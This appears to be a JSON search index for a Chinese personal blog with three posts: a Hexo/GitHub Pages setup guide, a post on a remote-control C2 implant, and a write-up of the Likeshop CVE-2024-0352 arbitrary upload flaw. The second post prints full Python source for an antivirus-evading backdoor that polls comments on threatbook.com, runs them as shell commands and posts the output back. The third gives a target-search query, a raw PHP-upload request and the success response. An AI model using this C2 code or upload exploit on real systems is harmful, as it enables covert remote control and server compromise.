[{"title":"Hexo+GitHub 搭建个人免费博客","url":"/2023/12/23/1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>恰点冷饭，最近某云笔记用着越来越不顺手，在寻找新的记笔记方法的同时，发现了之前利用Hexo+GitHub搭建个人博客的一些帖子，借此机会来搭建一个，也让这篇笔记成为第一篇博文。</p>\n<hr>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p>通过 Hexo（一个静态博客框架），将Markdown 文档解析渲染成静态的 HTML 网页，再通过  GitHub Pages（由 GitHub 官方提供的一种免费的静态站点托管服务）在 GitHub 仓库里托管和发布自己的静态网站页面。</p>\n<p>由此可见一个明显的缺点，需要基于本地环境。</p>\n<p>但好处就是免费且稳定啦。</p>\n<hr>\n<h2 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h2><h3 id=\"本地环境搭建\"><a href=\"#本地环境搭建\" class=\"headerlink\" title=\"本地环境搭建\"></a>本地环境搭建</h3><h4 id=\"安装Node-js\"><a href=\"#安装Node-js\" class=\"headerlink\" title=\"# 安装Node.js\"></a># 安装Node.js</h4><ul>\n<li>Node.js：<a href=\"https://nodejs.org/zh-cn\">Node.js (nodejs.org)</a></li>\n</ul>\n<h4 id=\"安装Git\"><a href=\"#安装Git\" class=\"headerlink\" title=\"# 安装Git\"></a># 安装Git</h4><ul>\n<li><p>Git：<a href=\"https://git-scm.com/downloads\">Git - Downloads (git-scm.com)</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">使用  node -v \\ npm -v \\ git --version 来查看是否安装成功</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p><img src=\"/imgs/1/image-20231222232935387.png\" alt=\"image-20231222232935387\"></p>\n<h4 id=\"安装Hexo\"><a href=\"#安装Hexo\" class=\"headerlink\" title=\"# 安装Hexo\"></a># 安装Hexo</h4><ul>\n<li><p>找一个盘符创建文件夹来存放Hexo，在此文件夹目录下右键  Opne Git Bash here  打开git命令行，依次输入下面命令。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install -g hexo-cli\t\t\t# 使用 npm 一键安装 Hexo 博客程序</span><br><span class=\"line\">hexo init      \t\t\t\t\t# 初始化</span><br><span class=\"line\">npm install    \t\t\t\t\t# 安装组件</span><br><span class=\"line\">hexo g   \t\t\t\t\t\t# 生成页面</span><br><span class=\"line\">hexo s   \t\t\t\t\t\t# 启动预览</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>访问：<a href=\"http://localhost:4000/\">http://localhost:4000</a> 出现初始页面即安装成功</p>\n</li>\n</ul>\n<h4 id=\"下载、应用主题\"><a href=\"#下载、应用主题\" class=\"headerlink\" title=\"# 下载、应用主题\"></a># 下载、应用主题</h4><ul>\n<li><p>在hexo目录下的themes文件夹下打开git bash，输入以下命令，下载主题</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/probberechts/hexo-theme-cactus.git</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>打开Hexo目录下的 _config.yml 文件，修改 theme:  参数为下载的主题的文件夹名称（在themes文件夹下）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Extensions</span><br><span class=\"line\">## Plugins: https://hexo.io/plugins/</span><br><span class=\"line\">## Themes: https://hexo.io/themes/</span><br><span class=\"line\">theme: hexo-theme-cactus</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>更新主题：重新在Hexo目录下打开一个 git 命令行，依次输入以下命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo clean\t\t\t\t\t\t# 清除缓存</span><br><span class=\"line\">hexo g\t\t\t\t\t\t\t# 重新生成public文件夹</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在另外一个运行着 hexo s 的 git 命令行中，按 CTRL+C ，然后输入 hexo s 相当于重启Hexo服务</p>\n</li>\n</ul>\n<h3 id=\"将博客部署到GitHub上\"><a href=\"#将博客部署到GitHub上\" class=\"headerlink\" title=\"将博客部署到GitHub上\"></a>将博客部署到GitHub上</h3><h4 id=\"新建仓库\"><a href=\"#新建仓库\" class=\"headerlink\" title=\"# 新建仓库\"></a># 新建仓库</h4><p><img src=\"/imgs/1/image-20231222235546982.png\" alt=\"image-20231222235546982\"></p>\n<h4 id=\"设置Git的全局用户名和邮箱\"><a href=\"#设置Git的全局用户名和邮箱\" class=\"headerlink\" title=\"# 设置Git的全局用户名和邮箱\"></a># 设置Git的全局用户名和邮箱</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global user.name &quot;GitHub 用户名&quot;</span><br><span class=\"line\">git config --global user.email &quot;GitHub 邮箱&quot;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"创建-SSH-密匙\"><a href=\"#创建-SSH-密匙\" class=\"headerlink\" title=\"# 创建 SSH 密匙\"></a># 创建 SSH 密匙</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa -C &quot;GitHub 邮箱&quot;\t\t# 一路回车</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"添加密钥\"><a href=\"#添加密钥\" class=\"headerlink\" title=\"# 添加密钥\"></a># 添加密钥</h4><ol>\n<li>进入 [C:\\Users\\用户名.ssh] 目录（要勾选显示“隐藏的项目”），用记事本打开公钥 id_rsa.pub 文件并复制里面的内容。</li>\n<li>登陆 GitHub ，进入 Settings 页面，选择左边栏的 SSH and GPG keys，点击 New SSH key。</li>\n<li>Title 随便取个名字，粘贴复制的 id_rsa.pub 内容到 Key 中，点击 Add SSH key 完成添加。</li>\n</ol>\n<h4 id=\"验证链接\"><a href=\"#验证链接\" class=\"headerlink\" title=\"# 验证链接\"></a># 验证链接</h4><ul>\n<li>打开 Git Bash，输入 <code>ssh -T git@github.com</code> 出现 “Are you sure……”，输入 yes 回车确认。</li>\n</ul>\n<h4 id=\"安装hexo-deployer-git\"><a href=\"#安装hexo-deployer-git\" class=\"headerlink\" title=\"# 安装hexo-deployer-git\"></a># 安装hexo-deployer-git</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"修改-config-yml-文件\"><a href=\"#修改-config-yml-文件\" class=\"headerlink\" title=\"# 修改 _config.yml 文件\"></a># 修改 _config.yml 文件</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">deploy:</span><br><span class=\"line\">  type: git</span><br><span class=\"line\">  repository: git@github.com:用户名/用户名.github.io.git</span><br><span class=\"line\">  branch: master</span><br></pre></td></tr></table></figure>\n\n<p>完成后运行 <code>hexo d</code> 将网站上传部署到 GitHub Pages。</p>\n<p>完成！这时访问我们的 GitHub 域名 <code>https://用户名.github.io</code> 就可以看到 Hexo 网站了。</p>\n<h3 id=\"开始使用\"><a href=\"#开始使用\" class=\"headerlink\" title=\"开始使用\"></a>开始使用</h3><h4 id=\"发布文章\"><a href=\"#发布文章\" class=\"headerlink\" title=\"# 发布文章\"></a># 发布文章</h4><p>进入博客所在目录，右键打开 Git Bash Here，创建博文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new &quot;My New Post&quot;</span><br></pre></td></tr></table></figure>\n\n<p>然后 source 文件夹中会出现一个 My New Post.md 文件，就可以使用 Markdown 编辑器在该文件中撰写文章了。</p>\n<p>写完后运行下面代码将文章渲染并部署到 GitHub Pages 上完成发布。<strong>以后每次发布文章都是这两条命令。</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo g   # 生成页面</span><br><span class=\"line\">hexo d   # 部署发布</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"主题微修\"><a href=\"#主题微修\" class=\"headerlink\" title=\"主题微修\"></a>主题微修</h3><h4 id=\"切换为中文\"><a href=\"#切换为中文\" class=\"headerlink\" title=\"# 切换为中文\"></a># 切换为中文</h4><ul>\n<li>更换项目的_config.yml 为下面的内容即可</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Site</span><br><span class=\"line\">title: mashiro4</span><br><span class=\"line\">subtitle: &#x27;&#x27;</span><br><span class=\"line\">description: &#x27;&#x27;</span><br><span class=\"line\">keywords:</span><br><span class=\"line\">author: mashiro4</span><br><span class=\"line\">language: zh-CN</span><br><span class=\"line\">timezone: &#x27;&#x27;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"新建导航栏\"><a href=\"#新建导航栏\" class=\"headerlink\" title=\"# 新建导航栏\"></a># 新建导航栏</h4><ul>\n<li>在.&#x2F;themes&#x2F;cactus&#x2F;_config.yml找到nav，例如添加一个search导航栏，在下面加上  search: &#x2F;search&#x2F;</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">nav:</span><br><span class=\"line\">  home: /</span><br><span class=\"line\">  about: /about/</span><br><span class=\"line\">  # articles: /archives/</span><br><span class=\"line\">  projects: https://github.com/mashiro4</span><br><span class=\"line\">  search: /search/</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"添加搜索插件\"><a href=\"#添加搜索插件\" class=\"headerlink\" title=\"# 添加搜索插件\"></a># 添加搜索插件</h4><ul>\n<li>先在在.&#x2F;themes&#x2F;cactus&#x2F;_config.yml找到nav添加一个 search 标签，如上一步。</li>\n<li>安装 hexo-generator-search 插件</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-generator-searchdb --save</span><br><span class=\"line\">hexo new page search\t\t\t\t\t\t#  为 search 标签创建一个默认页面</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>进入项目地址下的source&#x2F;search&#x2F;index.md，修改md文件的头为</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: Search</span><br><span class=\"line\">type: search</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"访问量统计插件-“不算子”\"><a href=\"#访问量统计插件-“不算子”\" class=\"headerlink\" title=\"# 访问量统计插件 “不算子”\"></a># 访问量统计插件 “不算子”</h4><ul>\n<li>打开模板目录 \\layout\\ _partial 下的 footer.ejs 文件，修改为</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;footer id=&quot;footer&quot;&gt;</span><br><span class=\"line\">  &lt;div class=&quot;footer-left&quot;&gt;</span><br><span class=\"line\">    &lt;%= __(&#x27;footer.copyright&#x27;) %&gt; &amp;copy;</span><br><span class=\"line\">    &lt;% var endYear = (theme.copyright &amp;&amp; theme.copyright.end_year) ? theme.copyright.end_year : new Date().getFullYear() %&gt;</span><br><span class=\"line\">    &lt;% var startYear = (theme.copyright &amp;&amp; theme.copyright.start_year) ? theme.copyright.start_year : new Date().getFullYear() %&gt;</span><br><span class=\"line\">    &lt;%= startYear &gt;= endYear ? endYear : startYear + &quot;-&quot; + endYear %&gt;</span><br><span class=\"line\">    &lt;%= config.author || config.title %&gt; 转载请注明出处</span><br><span class=\"line\">  &lt;/div&gt;</span><br><span class=\"line\">  &lt;div class=&quot;footer-right&quot;&gt;</span><br><span class=\"line\">    &lt;nav&gt;</span><br><span class=\"line\">         &lt;ul&gt;</span><br><span class=\"line\">            &lt;% if (theme.busuanzi &amp;&amp; theme.busuanzi.enable)&#123; %&gt;</span><br><span class=\"line\">              &lt;!-- 不蒜子统计 --&gt;</span><br><span class=\"line\">              &lt;span id=&quot;busuanzi_container_site_pv&quot;&gt;</span><br><span class=\"line\">                  本站总访问量&lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;/span&gt;次</span><br><span class=\"line\">              &lt;/span&gt;</span><br><span class=\"line\">              &lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt;</span><br><span class=\"line\">              &lt;span id=&quot;busuanzi_container_site_uv&quot; style=&#x27;display:none&#x27;&gt;</span><br><span class=\"line\">                      本站访客数&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;/span&gt;人</span><br><span class=\"line\">              &lt;/span&gt;</span><br><span class=\"line\">            &lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">            &lt;% &#125; %&gt;</span><br><span class=\"line\">          &lt;/ul&gt;</span><br><span class=\"line\">    &lt;/nav&gt;</span><br><span class=\"line\">  &lt;/div&gt;</span><br><span class=\"line\">&lt;/footer&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>然后老办法</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo clean\t\t# 清除缓存</span><br><span class=\"line\">hexo g\t\t\t# 重新生成页面</span><br><span class=\"line\">hexo d\t\t\t# 上传到GitHub仓库</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"在首页上添加一段话\"><a href=\"#在首页上添加一段话\" class=\"headerlink\" title=\"# 在首页上添加一段话\"></a># 在首页上添加一段话</h4><ul>\n<li>打开主题文件下的 \\layout 文件夹下的index.ejs文件，修改前几行如下，其他的修改举一反三。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;section id=&quot;about&quot; class=&quot;p-note&quot;&gt;</span><br><span class=\"line\">  &lt;% if (config.description) &#123; %&gt;</span><br><span class=\"line\">    &lt;%- markdown(config.description) %&gt;</span><br><span class=\"line\">  &lt;% &#125; %&gt;</span><br><span class=\"line\">  &lt;% if (theme.social_links) &#123; %&gt;</span><br><span class=\"line\">    &lt;p&gt;</span><br><span class=\"line\">      但见荆山玉损&lt;br&gt;</span><br><span class=\"line\">      可惜数十年结发成亲&lt;br&gt;</span><br><span class=\"line\">      宝鉴花残&lt;br&gt;</span><br><span class=\"line\">      枉费九十日东君匹配&lt;br&gt;</span><br><span class=\"line\">      花容倒卧&lt;br&gt;</span><br><span class=\"line\">      有如西苑芍药倚朱栏</span><br><span class=\"line\">      &lt;% var nb_links = theme.social_links.length %&gt;</span><br><span class=\"line\">      &lt;% var i = 0 %&gt;</span><br><span class=\"line\">      &lt;br&gt;&lt;br&gt;</span><br><span class=\"line\">      &lt;% for(var &#123;label, icon, link&#125; of theme.social_links) &#123; %&gt;</span><br><span class=\"line\">        &lt;% var title = label || icon %&gt;</span><br><span class=\"line\">        &lt;% if (icon == &#x27;mail&#x27;) &#123; %&gt;</span><br><span class=\"line\">          &lt;a class=&quot;icon u-email&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; href=&quot;&lt;%- link %&gt;&quot; aria-label=&quot;&lt;%- title %&gt;&quot; title=&quot;&lt;%- title %&gt;&quot;&gt;</span><br><span class=\"line\">            &lt;i class=&quot;fa-solid fa-envelope&quot;&gt;&lt;/i&gt;&lt;!--</span><br><span class=\"line\">      ---&gt;&lt;/a&gt;</span><br><span class=\"line\">        &lt;% &#125; else if (icon == &#x27;rss&#x27;) &#123; %&gt;</span><br><span class=\"line\">          &lt;a class=&quot;icon&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; href=&quot;&lt;%- link %&gt;&quot; aria-label=&quot;&lt;%- title %&gt;&quot; title=&quot;&lt;%- title %&gt;&quot;&gt;</span><br><span class=\"line\">            &lt;i class=&quot;fa-solid fa-rss&quot;&gt;&lt;/i&gt;</span><br><span class=\"line\">          &lt;/a&gt;</span><br><span class=\"line\">        &lt;% &#125; else &#123; %&gt;</span><br><span class=\"line\">          &lt;a class=&quot;icon u-url&quot; target=&quot;_blank&quot; rel=&quot;noopener me&quot; href=&quot;&lt;%- url_for(link) %&gt;&quot; aria-label=&quot;&lt;%- title %&gt;&quot; title=&quot;&lt;%- title %&gt;&quot;&gt;</span><br><span class=\"line\">            &lt;i class=&quot;fa-brands fa-&lt;%= icon %&gt;&quot;&gt;&lt;/i&gt;&lt;!--</span><br><span class=\"line\">      ---&gt;&lt;/a&gt;&lt;!--</span><br><span class=\"line\">    ---&gt;&lt;% &#125; %&gt;&lt;!--</span><br><span class=\"line\">    ---&gt;&lt;%= ( nb_links &gt; 0 &amp;&amp; i &lt; nb_links-1 ?</span><br><span class=\"line\">            ( i == nb_links-2 ? &#x27; &#x27;+&#x27; &#x27;</span><br><span class=\"line\">            : __(&#x27;index.enum_comma&#x27;)+&#x27; &#x27; )</span><br><span class=\"line\">            : &#x27;.&#x27; ) %&gt;</span><br><span class=\"line\">        &lt;% i+=1 %&gt;</span><br><span class=\"line\">      &lt;% &#125; %&gt;</span><br><span class=\"line\">    &lt;/p&gt;</span><br><span class=\"line\">  &lt;% &#125; %&gt;</span><br><span class=\"line\">&lt;/section&gt;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文章：\"><a href=\"#参考文章：\" class=\"headerlink\" title=\"参考文章：\"></a>参考文章：</h2><ol>\n<li><a href=\"https://garck3h.github.io/2020/02/28/%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/\">https://garck3h.github.io/2020/02/28/%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/60578464\">https://zhuanlan.zhihu.com/p/60578464</a></li>\n</ol>\n<hr>\n","categories":["未分类"]},{"title":"微步社区白名单C2","url":"/2023/12/25/2/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>看到有师傅发利用某社区的评论实现C2，试验一下。</p>\n<hr>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p>利用某社区天然白名单特性，通过 评论 来实现免杀的远控C2。</p>\n<hr>\n<h2 id=\"main-py\"><a href=\"#main-py\" class=\"headerlink\" title=\"main.py\"></a>main.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from subprocess import Popen, PIPE</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\">import json</span><br><span class=\"line\"></span><br><span class=\"line\">def command(cmd):</span><br><span class=\"line\">    # Popen()函数使用shell执行命令，stdout和stderr是子进程的标准输出和标准错误输出</span><br><span class=\"line\">    process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)</span><br><span class=\"line\">    # 启动并等待子进程完成，通过stdout和stderr读取子进程的输出</span><br><span class=\"line\">    stdout, stderr = process.communicate()</span><br><span class=\"line\">    # 返回标准输出并解码为gbk编码的字符串</span><br><span class=\"line\">    return stdout.decode(&#x27;gbk&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def get_comments(short_message_id):</span><br><span class=\"line\">    base_url = &quot;https://x.threatbook.com/v5/node/user/article/queryComments?shortThreatId=&quot;+short_message_id</span><br><span class=\"line\">    try:</span><br><span class=\"line\">     #模拟用户发包</span><br><span class=\"line\">        response = requests.get(base_url)</span><br><span class=\"line\">        # 直接使用 response.json() 获取对象</span><br><span class=\"line\">        json_object = response.json()</span><br><span class=\"line\">        # 定义一个评论列表</span><br><span class=\"line\">        comments_list = json_object[&quot;data&quot;][&quot;list&quot;]</span><br><span class=\"line\">        # 提取第一个 comments 对应的值</span><br><span class=\"line\">        first_comment = comments_list[0][&quot;comments&quot;]</span><br><span class=\"line\">        first_comment1 = first_comment[3:]</span><br><span class=\"line\">        # 返回第一个 comments 对应的值</span><br><span class=\"line\">        return first_comment,first_comment1</span><br><span class=\"line\">        # 错误性判断</span><br><span class=\"line\">    except requests.exceptions.RequestException as e:</span><br><span class=\"line\">        print(f&quot;Error: &#123;e&#125;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def send_comment(comment, short_message_id, csrf_token, rememberme, xx_csrf):</span><br><span class=\"line\">    url = &quot;https://x.threatbook.com/v5/node/user/article/saveComment&quot;</span><br><span class=\"line\"> #请求头</span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        &quot;Host&quot;: &quot;x.threatbook.com&quot;,</span><br><span class=\"line\">        &quot;Cookie&quot;: f&quot;csrfToken=&#123;csrf_token&#125;; rememberme=&#123;rememberme&#125;; xx-csrf=&#123;xx_csrf&#125;&quot;,</span><br><span class=\"line\">        &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class=\"line\">        &quot;X-Csrf-Token&quot;: csrf_token,</span><br><span class=\"line\">        &quot;Xx-Csrf&quot;: xx_csrf,</span><br><span class=\"line\">        &quot;Sec-Ch-Ua-Mobile&quot;: &quot;?0&quot;,</span><br><span class=\"line\">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> #请求体</span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        &quot;comment&quot;: comment,</span><br><span class=\"line\">        &quot;isAnonymous&quot;: &quot;False&quot;,</span><br><span class=\"line\">        &quot;targetId&quot;: &quot;0&quot;,</span><br><span class=\"line\">        &quot;shortMeaasgeId&quot;: short_message_id</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> #回显命令</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        response = requests.post(url, json=data, headers=headers)</span><br><span class=\"line\">        return response.json()</span><br><span class=\"line\">    except requests.exceptions.RequestException as e:</span><br><span class=\"line\">        print(f&quot;Error: &#123;e&#125;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    # 打开 JSON 文件并读取内容</span><br><span class=\"line\">    with open(&#x27;data.json&#x27;, &#x27;r&#x27;) as f:</span><br><span class=\"line\">        json_str = f.read()</span><br><span class=\"line\"></span><br><span class=\"line\">    # 解析 JSON 数据</span><br><span class=\"line\">    data = json.loads(json_str)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 读取各个字段的值</span><br><span class=\"line\">    short_message_id = data[&#x27;short_message_id&#x27;]</span><br><span class=\"line\">    csrfToken = data[&#x27;csrfToken&#x27;]</span><br><span class=\"line\">    rememberme = data[&#x27;rememberme&#x27;]</span><br><span class=\"line\">    xx_csrf = data[&#x27;xx_csrf&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        cmd = get_comments(short_message_id)[0]</span><br><span class=\"line\">        if cmd.startswith(&quot;你好&quot;):</span><br><span class=\"line\">            # 如果以 &quot;你好&quot; 开头，则执行下一步操作</span><br><span class=\"line\">            send_comment(command(get_comments(short_message_id)[1]), short_message_id, csrfToken, rememberme, xx_csrf)</span><br><span class=\"line\">            print(&quot;执行成功&quot;)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            # 如果不以 &quot;你好&quot; 开头，则执行其他操作</span><br><span class=\"line\">            print(&quot;命令错误&quot;)</span><br><span class=\"line\">        time.sleep(5)  # 延时5秒</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"data-json\"><a href=\"#data-json\" class=\"headerlink\" title=\"data.json\"></a>data.json</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;short_message_id&quot;: &quot;&quot;,</span><br><span class=\"line\">    &quot;csrfToken&quot;: &quot;&quot;,</span><br><span class=\"line\">    &quot;rememberme&quot;: &quot;&quot;,</span><br><span class=\"line\">    &quot;xx_csrf&quot;: &quot;&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"实现效果\"><a href=\"#实现效果\" class=\"headerlink\" title=\"实现效果\"></a>实现效果</h2><p><img src=\"/imgs/2/image-20231225103444513.png\" alt=\"image-20231225103444513\"></p>\n<h2 id=\"参考文章：\"><a href=\"#参考文章：\" class=\"headerlink\" title=\"参考文章：\"></a>参考文章：</h2><ol>\n<li><a href=\"https://mp.weixin.qq.com/s/46dGdWOoNOVp_XDgYDMzwg\">https://mp.weixin.qq.com/s/46dGdWOoNOVp_XDgYDMzwg</a></li>\n</ol>\n<hr>\n","categories":["技术实现"]},{"title":"Likeshop文件上传【CVE-2024-0352】","url":"/2024/01/16/3/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"漏洞名称\"><a href=\"#漏洞名称\" class=\"headerlink\" title=\"漏洞名称\"></a>漏洞名称</h2><p>Likeshop HTTP POST 请求 File.php userFormImage 无限制上传漏洞</p>\n<hr>\n<h2 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h2><p>Likeshop &lt; 2.5.7.20210311</p>\n<h2 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h2><p>CVE-2024-0352是一个影响Likeshop（一款基于ThinkPHP开发的电商系统）的严重漏洞，它存在于server&#x2F;application&#x2F;api&#x2F;controller&#x2F;File.php文件的FileServer::userFormImage函数中，该函数处理HTTP POST请求时没有对file参数进行合法性检查，导致攻击者可以上传任意文件，包括恶意代码，从而实现远程代码执行（RCE）</p>\n<p>这个漏洞的影响版本是Likeshop 2.5.7.20210311及之前的版本，建议您尽快升级到最新版本，或者修改File.php文件，增加对file参数的过滤和验证，防止任意文件上传。</p>\n<h2 id=\"FOFA语句\"><a href=\"#FOFA语句\" class=\"headerlink\" title=\"FOFA语句\"></a>FOFA语句</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">icon_hash=&quot;874152924&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/01/16/3/work\\博客\\imgs\\3\\image-20240116121915635.png\" alt=\"image-20240116121915635\"></p>\n<h2 id=\"payload\"><a href=\"#payload\" class=\"headerlink\" title=\"payload\"></a>payload</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /api/file/formimage HTTP/2</span><br><span class=\"line\">Host: </span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36</span><br><span class=\"line\">Content-Length: 201</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei</span><br><span class=\"line\">Accept-Encoding: gzip</span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundarygcflwtei</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;;filename=&quot;test.php&quot;</span><br><span class=\"line\">Content-Type: application/x-php</span><br><span class=\"line\"></span><br><span class=\"line\">test</span><br><span class=\"line\">------WebKitFormBoundarygcflwtei--</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"成功回显\"><a href=\"#成功回显\" class=\"headerlink\" title=\"成功回显\"></a>成功回显</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">HTTP/2 200 OK</span><br><span class=\"line\">Server: nginx</span><br><span class=\"line\">Date: Tue, 16 Jan 2024 03:55:02 GMT</span><br><span class=\"line\">Content-Type: application/json; charset=utf-8</span><br><span class=\"line\">Access-Control-Allow-Origin: *</span><br><span class=\"line\">Access-Control-Allow-Headers: Authorization, Sec-Fetch-Mode, DNT, X-Mx-ReqToken, Keep-Alive, User-Agent, If-Match, If-None-Match, If-Unmodified-Since, X-Requested-With, If-Modified-Since, Cache-Control, Content-Type, Accept-Language, Origin, Accept-Encoding,Access-Token,token</span><br><span class=\"line\">Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, post</span><br><span class=\"line\">Access-Control-Max-Age: 1728000</span><br><span class=\"line\">Access-Control-Allow-Credentials: true</span><br><span class=\"line\">Strict-Transport-Security: max-age=31536000</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;code&quot;:1,&quot;msg&quot;:&quot;上传文件成功&quot;,&quot;data&quot;:&#123;&quot;url&quot;:&quot;https:\\/\\/xxx.xxx.xxx\\/uploads\\/user\\/20240116115502809dd2034.php&quot;,&quot;base_url&quot;:&quot;uploads\\/user\\/20240116115502809dd2034.php&quot;,&quot;name&quot;:&quot;test.php&quot;&#125;,&quot;show&quot;:0,&quot;time&quot;:&quot;0.041100&quot;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/01/16/3/work\\博客\\imgs\\3\\image-20240116121643623.png\" alt=\"image-20240116121643623\"></p>\n<p><img src=\"/2024/01/16/3/work\\博客\\imgs\\3\\image-20240116121719105.png\" 